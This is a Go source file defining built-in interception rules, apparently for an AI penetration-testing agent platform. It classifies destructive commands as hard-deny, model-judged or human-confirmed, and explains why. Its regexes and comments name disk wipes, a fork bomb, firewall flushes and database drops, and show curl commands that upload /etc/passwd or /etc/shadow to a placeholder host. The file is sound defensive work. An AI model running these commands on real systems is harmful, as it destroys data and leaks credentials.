package db

// 内置拦截规则的**单一事实源**。
//
// 为什么要把它从 seed SQL 里抽出来：2026-10-22 的整改前，内置规则的定义
// 散落在 seedDefaultInterceptRules / V2 / V3 / V4 四个函数里，规则的动作
// （deny/ask/judge）直接写死在 SQL 参数里。后果是：
//
//   - 界面显示的规则语义与实际生效的无法对照，只能逐个读 SQL；
//   - 单元测试只能拿到正则字符串，断言不了「这条规则该硬拦还是该研判」；
//   - 已部署实例要改动作只能靠一次性迁移，而迁移和 seed 各写一份，容易漂移。
//
// 这里把每条内置规则连同它的**分类**一起声明出来，seed 与迁移都从这张表
// 生成，测试直接断言这张表。
//
// ## 分类的判据
//
// 用户的要求是「理清哪些是明令禁止的、哪些可以交给 Agent 研判」。判据用
// 两根轴，与裁决提示词（intercept/prompt.go 的 D1–D6 / A1–A6）保持一致：
//
//	不可逆性 × 作用对象
//
//	- 不可逆 且 作用对象与上下文无关 → **明令禁止**（hard deny）。
//	  执行了就没法恢复，而且没有任何合法的渗透测试用途。
//	- 不可逆 但 作用对象取决于上下文 → **交给 Agent 研判**（judge）。
//	  删的可能是本次测试自己建的产物（合法），也可能是生产数据（破坏）。
//	  模型看得到完整参数，能判断两者；规则层看不到。
//	- 与目标资产无关、只改平台自身状态 → **人工确认**（ask）。
//	  开监听端口、改平台配置属于能力边界变更，人比模型有判断力。
//
// 判据的边界：「明令禁止」要求**任何语境**都不可逆且无合法用途。仅仅「通常
// 很危险」不构成硬禁——2026-10-20 的一次实测（提交 39d5516）把全部内置
// 规则改成 judge 后，11 次真实调用被规则直接拦下，其中多次是合法探测；
// 反过来，把 SQL DROP TABLE 这类作用对象高度依赖上下文的操作硬禁，又会砍掉
// 「越权删除」这类漏洞的验证能力。两头都要避免。

// 规则分类。
const (
	// classHardDeny 是「明令禁止」：任何语境下都不可逆且无合法渗透用途。
	// 命中即拒绝，**不调用模型**——既省一次 LLM 往返，也不会因为模型抖动
	// 而把关卡敞开。
	classHardDeny = "hard_deny"

	// classJudge 是「交给 Agent 研判」：作用对象依赖上下文，模型看得到完整
	// 参数能判断这是测试产物还是生产资产。
	//
	// 命中后走一次模型裁决。规则必须同时声明 timeout_action——模型不可用/
	// 超时时怎么办，由规则作者自己决定（硬危险类规则声明 deny，避免模型抖动
	// 就放过）。
	classJudge = "judge"

	// classAsk 是「人工确认」：与目标资产无关，改的是平台自身状态或占用
	// 平台资源。
	classAsk = "ask"
)

// builtinRule 是内置规则的一条声明。
type builtinRule struct {
	// name 是规则名（同时是迁移时定位规则的键）。
	name string
	// target 是匹配目标：tool_name | tool_input。
	target string
	// typ 是匹配类型：string | regex。
	typ string
	// pattern 是匹配模式。
	pattern string
	// action 是落库的动作：deny | ask | judge。
	action string
	// class 是分类（classHardDeny / classJudge / classAsk），决定 action 的
	// 语义来源与判定依据。
	class string
	// rationale 说明「为什么是这一类」——这是分类的凭据，改动分类时必须
	// 同步更新。
	rationale string
	// message 是命中时回传给模型的说明。
	message string
	// priority 是优先级（高者先匹配）。
	priority int
	// seedBatch 是这条规则属于哪一批 seed（v1/v2/v3/v4）。
	//
	// 分批的原因是历史沿革：内置规则是逐批加上去的，每批有自己的 settings
	// flag（intercept_default_rules_v1…v4），已部署实例靠 flag 决定「这批
	// 还要不要插」。全新安装时四批依次执行，等价于一次性插全——所以批次只
	// 影响「插不插」，不影响「插什么」：内容统一来自 builtinInterceptRules。
	seedBatch string
	// timeoutEnabled 声明本规则是否自带超时策略。
	timeoutEnabled bool
	// timeoutSeconds 是本规则的裁决墙钟上限（秒）。
	timeoutSeconds int
	// timeoutAction 是本规则在「模型裁决失败/超时」后的动作。
	timeoutAction string
}

// hardDenyTimeoutSeconds 是硬禁类规则交由模型裁决时的墙钟上限。
//
// 硬禁类规则通常根本不会走到裁决（它们的 action 就是 deny）。但规则作者
// 可能把某条硬禁规则改成 judge 试水——那时它仍应保留「模型来不及答就直接
// 拒绝」的安全语义。
const hardDenyTimeoutSeconds = 30

// judgeTimeoutSeconds 是研判类规则的裁决墙钟上限。
//
// 90s：思考型模型的裁决耗时随命令长度而变（实测短命令 4~26 秒，长 shell
// 脚本明显更久），且正文为空时要升预算重试——时间给短了会把「模型其实能
// 裁决」误判成超时失败。
const judgeTimeoutSeconds = 90

// judgeTimeoutActionAllow 是研判类规则的默认失败/超时动作。
//
// 为什么默认放行而不是拒绝：研判类规则命中的操作**本身可能是合法的**
// （删自己建的测试库、清自己建的临时表）。模型超时只是「没答上来」，
// 不是「有问题」——把它默认判成拒绝，等于模型一抖动就误伤合法操作。
// 真正危险的类别已经被单独划成硬禁，那边才是「超时即拒绝」。
const judgeTimeoutActionAllow = "allow"

// builtinInterceptRules 是全部内置拦截规则的声明。
//
// 顺序不影响匹配（匹配按 priority DESC、id ASC 走），但按分类分组便于
// 逐条复核。
var builtinInterceptRules = []builtinRule{
	// ── 明令禁止：任何语境都不可逆，且无合法渗透用途 ──────────────────
	{
		name:           "[内置] 磁盘格式化 mkfs",
		seedBatch:      "v1",
		target:         "tool_input",
		typ:            "regex",
		pattern:        `\bmkfs\b`,
		action:         "deny",
		class:          classHardDeny,
		rationale:      "格式化任何块设备都不可逆，且渗透测试不需要格式化磁盘——没有任何合法用途。",
		message:        "禁止格式化磁盘（mkfs）",
		timeoutEnabled: true,
		timeoutSeconds: hardDenyTimeoutSeconds,
		timeoutAction:  "deny",
		priority:       100,
	},
	{
		name:           "[内置] 覆写磁盘设备 dd",
		seedBatch:      "v1",
		target:         "tool_input",
		typ:            "regex",
		pattern:        `\bdd\b[^|\n]{0,100}\bof=\s*/dev/[a-zA-Z]`,
		action:         "deny",
		class:          classHardDeny,
		rationale:      "dd of=/dev/X 覆写块设备不可逆，无合法渗透用途。",
		message:        "禁止使用 dd 覆写磁盘设备",
		timeoutEnabled: true,
		timeoutSeconds: hardDenyTimeoutSeconds,
		timeoutAction:  "deny",
		priority:       100,
	},
	{
		name:           "[内置] 磁盘擦除 shred / wipe",
		seedBatch:      "v1",
		target:         "tool_input",
		typ:            "regex",
		pattern:        `\b(?:shred|wipe)\b[^|\n]{0,80}/dev/[a-zA-Z]`,
		action:         "deny",
		class:          classHardDeny,
		rationale:      "shred/wipe 擦除块设备不可逆，无合法渗透用途。",
		message:        "禁止对磁盘设备执行 shred/wipe 擦除",
		timeoutEnabled: true,
		timeoutSeconds: hardDenyTimeoutSeconds,
		timeoutAction:  "deny",
		priority:       100,
	},
	{
		name:           "[内置] Fork 炸弹",
		seedBatch:      "v1",
		target:         "tool_input",
		typ:            "regex",
		pattern:        `:\(\)\s*\{[^}]*:\|:`,
		action:         "deny",
		class:          classHardDeny,
		rationale:      "Fork 炸弹必然拖垮宿主进程与所有在跑任务，没有任何合法用途。",
		message:        "禁止执行 Fork 炸弹",
		timeoutEnabled: true,
		timeoutSeconds: hardDenyTimeoutSeconds,
		timeoutAction:  "deny",
		priority:       100,
	},
	{
		name:           "[内置] 杀死全部进程",
		seedBatch:      "v1",
		target:         "tool_input",
		typ:            "regex",
		pattern:        `\bkill\s+-9\s+-1\b|\bkillall\s+-9\b`,
		action:         "deny",
		class:          classHardDeny,
		rationale:      "kill -9 -1 / killall -9 不可逆地打断宿主的全部服务（含本平台自身与所有在跑任务），测试不需要。",
		message:        "禁止 kill -9 -1 或 killall -9（杀死所有进程）",
		timeoutEnabled: true,
		timeoutSeconds: hardDenyTimeoutSeconds,
		timeoutAction:  "deny",
		priority:       100,
	},
	{
		name:           "[内置] 清空防火墙规则",
		seedBatch:      "v1",
		target:         "tool_input",
		typ:            "regex",
		pattern:        `\biptables\s+(?:-F|--flush)\b|\bnft\s+flush\s+ruleset\b`,
		action:         "deny",
		class:          classHardDeny,
		rationale:      "清空防火墙规则会抹掉宿主的安全策略（可能让宿主失防），且与目标资产无关——测试不需要改宿主的防火墙。",
		message:        "禁止清空防火墙规则（iptables -F / nft flush）",
		timeoutEnabled: true,
		timeoutSeconds: hardDenyTimeoutSeconds,
		timeoutAction:  "deny",
		priority:       100,
	},
	{
		name:      "[内置] 关机 / 重启",
		seedBatch: "v1",
		target:    "tool_input",
		typ:       "regex",
		// 必须出现在【命令位置】（行首、或 ; && | 之后、或 sudo/doas 之后），
		// 而不是任意位置。agent 探测设备管理接口时会枚举 /reboot /reset 这类
		// 路径，裸 \b 匹配会把它们当成关机命令（实测误伤）。URL 里的 reboot
		// 前面是 / 或 "，都不在命令位置。
		pattern:        `(?:^|[;&|]\s*|\b(?:sudo|doas)\s+)(?:shutdown|reboot|halt|poweroff)\b|\binit\s+[06]\b`,
		action:         "deny",
		class:          classHardDeny,
		rationale:      "关机/重启会中断宿主与平台上的所有任务，不可逆且无合法渗透用途（对应裁决策略 D5）。",
		message:        "禁止执行关机或重启命令",
		timeoutEnabled: true,
		timeoutSeconds: hardDenyTimeoutSeconds,
		timeoutAction:  "deny",
		priority:       100,
	},
	{
		name:           "[内置] Redis FLUSHALL / FLUSHDB",
		seedBatch:      "v1",
		target:         "tool_input",
		typ:            "regex",
		pattern:        `(?i)\b(?:FLUSHALL|FLUSHDB)\b`,
		action:         "deny",
		class:          classHardDeny,
		rationale:      "清空整个 Redis 持久化集不可逆；FLUSHDB 的库归属虽依赖上下文，但 flush 的对象永远是「整个库」而非测试产物，且渗透测试不需要它。",
		message:        "禁止执行 Redis FLUSHALL / FLUSHDB，可能清空全部缓存数据",
		timeoutEnabled: true,
		timeoutSeconds: hardDenyTimeoutSeconds,
		timeoutAction:  "deny",
		priority:       90,
	},
	{
		name:           "[内置] SQL DROP DATABASE / SCHEMA",
		seedBatch:      "v1",
		target:         "tool_input",
		typ:            "regex",
		pattern:        `(?i)\bDROP\s+(?:DATABASE|SCHEMA)\b`,
		action:         "deny",
		class:          classHardDeny,
		rationale:      "删掉整个库/结构不可逆，且渗透测试不需要删库——验证注入用 DROP TABLE 即可。DROP TABLE 作用对象高度依赖上下文，归入研判类。",
		message:        "禁止执行 DROP DATABASE / DROP SCHEMA（整个库与结构不可逆地销毁）",
		timeoutEnabled: true,
		timeoutSeconds: hardDenyTimeoutSeconds,
		timeoutAction:  "deny",
		priority:       90,
	},
	{
		name:      "[内置] 清空系统关键目录",
		seedBatch: "v1",
		target:    "tool_input",
		typ:       "regex",
		// 关键目录下的【通配】删除（rm -rf /var/lib/*、rm -rf /etc/*）：整棵
		// 目录树被清空，性质与删整个目录相同。关键目录可能在任意路径段，
		// 所以这里匹配「路径中某一段是关键目录 + 紧跟通配」。
		pattern:        `\brm\b[^"'\n]{0,120}["'\s][^"'\n]{0,80}/(?:etc|bin|usr|boot|var|lib|sys|proc|dev|sbin|root)/\*`,
		action:         "deny",
		class:          classHardDeny,
		rationale:      "清空宿主系统关键目录树（rm -rf /etc/*、rm -rf /var/lib/*）必然破坏宿主本身，与目标资产无关——测试产物不会放在宿主关键目录里。",
		message:        "禁止清空系统关键目录下的内容",
		timeoutEnabled: true,
		timeoutSeconds: hardDenyTimeoutSeconds,
		timeoutAction:  "deny",
		priority:       100,
	},

	// ── 交给 Agent 研判：作用对象依赖上下文 ───────────────────────────
	{
		name:           "[内置] 递归强制删除 rm -rf",
		seedBatch:      "v1",
		target:         "tool_input",
		typ:            "regex",
		pattern:        `(?i)\brm\b.{0,80}(?:-[a-z]*r[a-z]*f[a-z]*|-[a-z]*f[a-z]*r[a-z]*|--recursive|--no-preserve-root)`,
		action:         "judge",
		class:          classJudge,
		rationale:      "被删的对象依赖上下文：可能是本次测试建的临时目录（合法清理），也可能是目标的生产目录（破坏，对应 D4）。裁决策略 D4 的原文例子正是 rm -rf /var/www/html——规则层看不到这个区别，模型看得到完整参数。",
		message:        "递归强制删除可能破坏目标资产，已交由模型结合参数研判",
		timeoutEnabled: true,
		timeoutSeconds: judgeTimeoutSeconds,
		timeoutAction:  judgeTimeoutActionAllow,
		priority:       100,
	},
	{
		name:      "[内置] 删除系统关键目录",
		seedBatch: "v1",
		target:    "tool_input",
		typ:       "regex",
		// 只拦「删掉整个关键目录」这一种不可逆动作：rm -rf /etc、rm -rf /etc/。
		// 不拦「删关键目录下的单个文件」——agent 探测时大量出现
		// rm -f /tmp_out.$$、rm -f /usr/share/nmap/scripts/_t.nse 这类正常清理；
		// 上一版用 `["'\s](/|...)` 的裸 / 分支，把所有 rm -f <任意路径> 都拦了，
		// 实测造成大量任务中断。
		// 关键目录名后面必须是路径边界（引号/空白/行尾）或紧跟斜杠；
		// /usr/share/x 里的 usr 只是路径中段，不算。
		pattern:        `\brm\b[^"'\n]{0,60}["'\s](/(?:etc|bin|usr|boot|var|lib|sys|proc|dev|sbin|root)(?:["'\s]|$|/(?:["'\s]|$)))`,
		action:         "judge",
		class:          classJudge,
		rationale:      "rm -rf /etc 不可逆，但删的可能是靶机（测试范围内的目标）而非宿主——靶机本来就是被测对象，删它的行为要看授权范围。交模型结合参数判断。",
		message:        "删除系统关键目录可能破坏目标环境，已交由模型结合参数研判",
		timeoutEnabled: true,
		timeoutSeconds: judgeTimeoutSeconds,
		timeoutAction:  judgeTimeoutActionAllow,
		priority:       100,
	},
	{
		name:           "[内置] SQL DROP TABLE / INDEX / VIEW",
		seedBatch:      "v1",
		target:         "tool_input",
		typ:            "regex",
		pattern:        `(?i)\bDROP\s+(?:TABLE|INDEX|VIEW|TABLESPACE|USER|ROLE)\b`,
		action:         "judge",
		class:          classJudge,
		rationale:      "删的表可能是本次测试建的测试表（合法），也可能是生产表（破坏，对应 D4）。裁决策略的 ASK 条款给的例子就是 DROP TABLE users_bak_0921——像备份表、归属不明的表。",
		message:        "SQL DROP 可能销毁数据库对象，已交由模型结合参数研判",
		timeoutEnabled: true,
		timeoutSeconds: judgeTimeoutSeconds,
		timeoutAction:  judgeTimeoutActionAllow,
		priority:       90,
	},
	{
		name:           "[内置] SQL TRUNCATE",
		seedBatch:      "v1",
		target:         "tool_input",
		typ:            "regex",
		pattern:        `(?i)\bTRUNCATE\s+(?:TABLE\s+)?\w`,
		action:         "judge",
		class:          classJudge,
		rationale:      "清空的表归属依赖上下文：本次测试建的测试表 vs 生产表。交模型研判。",
		message:        "SQL TRUNCATE 可能清空数据表，已交由模型结合参数研判",
		timeoutEnabled: true,
		timeoutSeconds: judgeTimeoutSeconds,
		timeoutAction:  judgeTimeoutActionAllow,
		priority:       90,
	},
	{
		name:           "[内置] MongoDB drop / dropDatabase",
		seedBatch:      "v1",
		target:         "tool_input",
		typ:            "regex",
		pattern:        `(?i)\.(?:dropDatabase|dropCollection|drop)\s*\(`,
		action:         "judge",
		class:          classJudge,
		rationale:      "同 SQL DROP：被删的集合归属依赖上下文。交模型研判。",
		message:        "MongoDB drop 操作可能清空数据，已交由模型结合参数研判",
		timeoutEnabled: true,
		timeoutSeconds: judgeTimeoutSeconds,
		timeoutAction:  judgeTimeoutActionAllow,
		priority:       90,
	},
	{
		name:           "[内置] curl / wget 发送 DELETE 请求",
		seedBatch:      "v1",
		target:         "tool_input",
		typ:            "regex",
		pattern:        `(?i)\bcurl\b[^|\n&;"]{0,300}(?:-X\s*DELETE|--request\s+DELETE|-XDELETE)|\bwget\b[^|\n&;"]{0,300}--method[=\s]+DELETE`,
		action:         "judge",
		class:          classJudge,
		rationale:      "DELETE 请求删的可能是本次测试建的记录（合法验证越权删除漏洞），也可能是真实订单（破坏，对应 D4）。裁决策略 D4 的原文例子就是 DELETE /api/orders/8821。",
		message:        "HTTP DELETE 请求可能删除目标数据，已交由模型结合参数研判",
		timeoutEnabled: true,
		timeoutSeconds: judgeTimeoutSeconds,
		timeoutAction:  judgeTimeoutActionAllow,
		priority:       80,
	},
	{
		name:           "[内置] Python HTTP 客户端 DELETE（requests/httpx/aiohttp）",
		seedBatch:      "v1",
		target:         "tool_input",
		typ:            "regex",
		pattern:        `(?i)\b(?:requests|httpx|aiohttp|urllib\.request)\.delete\s*\(|session\.delete\s*\(|client\.delete\s*\(`,
		action:         "judge",
		class:          classJudge,
		rationale:      "同 curl DELETE：作用对象依赖上下文。交模型研判。",
		message:        "Python HTTP 客户端发送 DELETE 请求，已交由模型结合参数研判",
		timeoutEnabled: true,
		timeoutSeconds: judgeTimeoutSeconds,
		timeoutAction:  judgeTimeoutActionAllow,
		priority:       80,
	},
	{
		name:           "[内置] 脚本中声明 HTTP DELETE 方法（JS/通用）",
		seedBatch:      "v1",
		target:         "tool_input",
		typ:            "regex",
		pattern:        `(?i)axios\.delete\s*\(|method\s*[:=]\s*['"]DELETE['"]`,
		action:         "judge",
		class:          classJudge,
		rationale:      "同 curl DELETE：作用对象依赖上下文。交模型研判。",
		message:        "脚本中声明并发送 HTTP DELETE 请求，已交由模型结合参数研判",
		timeoutEnabled: true,
		timeoutSeconds: judgeTimeoutSeconds,
		timeoutAction:  judgeTimeoutActionAllow,
		priority:       80,
	},
	{
		name:           "[内置] 批量清空 / 清除接口路径",
		seedBatch:      "v1",
		target:         "tool_input",
		typ:            "regex",
		pattern:        `(?i)/(?:clear|wipe|flush|purge|truncate|drop|destroy|factory[-_]reset|reset[-_]all)(?:[/?#"'\s]|$)`,
		action:         "judge",
		class:          classJudge,
		rationale:      "路径本身不含归属信息：/clear 可能是测试专用接口，也可能是生产批量清理接口。交模型结合完整 URL 研判。",
		message:        "批量清空或销毁类接口可能删除目标数据，已交由模型结合参数研判",
		timeoutEnabled: true,
		timeoutSeconds: judgeTimeoutSeconds,
		timeoutAction:  judgeTimeoutActionAllow,
		priority:       80,
	},
	{
		name:      "[内置] 删除类接口路径",
		seedBatch: "v3",
		target:    "tool_input",
		typ:       "regex",
		// The pattern deliberately requires a separator after the verb so /delivery,
		// /details, /delta and /delegate do not match, while /deleteAll, /delete_user and
		// /delete-user do. destroy is re-covered here because v1's rule does not allow a
		// suffix (/destroyAll was missed).
		pattern:        `(?i)/(?:(?:delete|remove|unlink|erase|destroy)[-\w]*|del)(?:[/?#"'\s]|$)`,
		action:         "judge",
		class:          classJudge,
		rationale:      "同「批量清空接口路径」：路径不含归属信息，交模型研判。",
		message:        "删除类接口可能删除目标数据，已交由模型结合参数研判",
		timeoutEnabled: true,
		timeoutSeconds: judgeTimeoutSeconds,
		timeoutAction:  judgeTimeoutActionAllow,
		priority:       80,
	},
	{
		name:           "[内置] 破坏性系统命令",
		seedBatch:      "v2",
		target:         "tool_input",
		typ:            "regex",
		pattern:        `(?i)\b(rm\s+-rf\s+/|mkfs|dd\s+if=|:\(\)\s*\{|shutdown|reboot|>\s*/dev/sd)`,
		action:         "judge",
		class:          classJudge,
		rationale:      "兜底规则：与上面各条硬禁规则有重叠，但覆盖面更宽（rm -rf / 根目录等）。硬禁规则已先命中并放行，落到这里的通常是需要上下文判断的形态——交模型研判。",
		message:        "破坏性命令已交由模型结合参数研判",
		timeoutEnabled: true,
		timeoutSeconds: judgeTimeoutSeconds,
		timeoutAction:  judgeTimeoutActionAllow,
		priority:       100,
	},

	// ── 人工确认：改的是平台自身状态或占用平台资源 ─────────────────────
	{
		name:      "[内置] 启停回连接收器",
		seedBatch: "v4",
		target:    "tool_name",
		typ:       "regex",
		pattern:   `^listener_(?:start|stop)$`,
		action:    "ask",
		class:     classAsk,
		rationale: "启停监听器会开放本机端口（接住目标回连）——这是平台能力边界与资源占用的变更，不是「目标资产会不会被破坏」。让模型裁决「要不要开端口」是错位的，应转人工。listener_sessions 是只读查询，不在本规则内。",
		message:   "启停回连接收器会开放本机端口；请确认监听端口、授权范围、出口可达性（C2 出口配置）与其他任务占用情况",
		priority:  120,

		timeoutEnabled: true,
		timeoutSeconds: 180,
		timeoutAction:  "allow",
	},

	// ── 数据外泄：把本机文件内容 POST 到外部 ─────────────────────────
	{
		name:      "[内置] 数据外泄管道",
		seedBatch: "v2",
		target:    "tool_input",
		typ:       "regex",
		// 只拦「带 @文件 上传」的形态：curl -d @/etc/passwd http://x、
		// curl -F file=@/etc/shadow http://x、wget --post-file=@/etc/passwd。
		//
		// 上一版的 pattern 是 `(?i)(curl|wget|nc|ncat)\b[^|]*\b(\|\s*(curl|wget|nc))`，
		// 它把 `curl 目标 | nc 自己的回连器` 也匹配上——而那是**授权测试的正常
		// 回连操作**（拿到 shell 后把结果送回自己的监听器）。于是这条规则长期
		// 默认停用：能防的没防，不该防的想防。
		//
		// 新 pattern 精确对准「把本地文件内容发出去」：必须有 @文件 参数。
		// 单纯的管道（| nc、| curl）不再匹配。
		//
		// 形态覆盖（实测踩过的坑）：
		//   curl -d @/etc/passwd http://x          → @ 紧跟选项
		//   curl -d "@/etc/passwd" http://x        → @ 在引号里
		//   curl -F file=@/etc/passwd http://x      → @ 前面有字段名（-F/--form 的
		//                                             标准用法就是 name=value）
		//   curl --form "payload=@/etc/passwd"      → 同上且整体带引号
		//   wget --post-file=@/etc/passwd http://x   → wget 的等价选项
		//
		// 判别点是 **@ 前面的那个字符**：文件引用形态里 @ 前面必然是空白、引号或
		// 等号（`@file`、`"@file"`、`name=@file`），而「@」出现在别处时前面是
		// 普通字符（邮箱 a@b.com、base64 串里的 @）。用 `[\s"'=]@` 锚定就同时
		// 覆盖了上面五种形态，又不会把邮箱误判成文件引用。
		pattern:        `(?i)\b(curl|wget)\b[^|;&\n]{0,200}(?:-d|--data(?:-binary|-raw)?|-F|--form|--upload-file|--post-file)(?:\s*=\s*|\s+)?[^|;&\n]{0,100}?[\s"'=]@(?:"[^"\n]{0,80}"|'[^'\n]{0,80}'|[^\s;|&"']{1,80})`,
		action:         "judge",
		class:          classJudge,
		rationale:      "把本机文件内容 POST 到外部是典型的数据外泄形态，但它也是「上传 webshell 验证上传漏洞」的合法操作（裁决策略 A1/A2）——交模型结合 URL 与文件路径研判。",
		message:        "命令疑似把本地文件内容上传到外部（@文件），已交由模型结合参数研判",
		timeoutEnabled: true,
		timeoutSeconds: judgeTimeoutSeconds,
		timeoutAction:  judgeTimeoutActionAllow,
		priority:       80,
	},

	// ── 收官研判：goal_met 一句话终结整个任务且只留「声称」痕迹 ────────
	// v0.3.88 体检 S3：此前 goal_met 完全不进拦截体系（连 enabled 工具集都没进），
	// 模型可以在无量化核对的情况下收官整个任务——提示词护栏（prove_goal 前核对
	// coverage.pct）拦不住非 prove_goal 路径。judge（而非 deny/ask）：正常收官是
	// 高频合法动作，走模型研判核对「是否量化达标/是否边际收益收官」即可；
	// 研判通过放行、未达标打回，两者都有留痕。
	{
		name:           "[内置] goal_met 收官研判",
		seedBatch:      "v5",
		target:         "tool_name",
		typ:            "regex",
		pattern:        `^goal_met$`,
		action:         "judge",
		class:          classJudge,
		rationale:      "goal_met 直接终结整个任务且不走 prove_goal 的逐条证据链。交模型研判：目标是否已量化达标，或是否属「边际收益已耗尽」的诚实收官；未经核对的提前盖章应打回。",
		message:        "整体收官声明（goal_met）已交由模型核对目标达成情况研判",
		timeoutEnabled: true,
		timeoutSeconds: judgeTimeoutSeconds,
		timeoutAction:  judgeTimeoutActionAllow,
		priority:       90,
	},
}

// builtinRulePattern 返回指定内置规则的 pattern。
//
// 用途：让「规则表」成为 pattern 的唯一定义处。db.go 里遗留的
// deleteEndpointPathPattern / listenerLifecycleToolPattern 都从这里派生，
// 避免出现「改了规则表、忘了改常量」的漂移。
//
// 规则不存在时返回空串——调用方（单元测试）会因此在编译期之外显式失败，
// 而不是静默用一个错的正则。
func builtinRulePattern(name string) string {
	for _, r := range builtinInterceptRules {
		if r.name == name {
			return r.pattern
		}
	}
	return ""
}
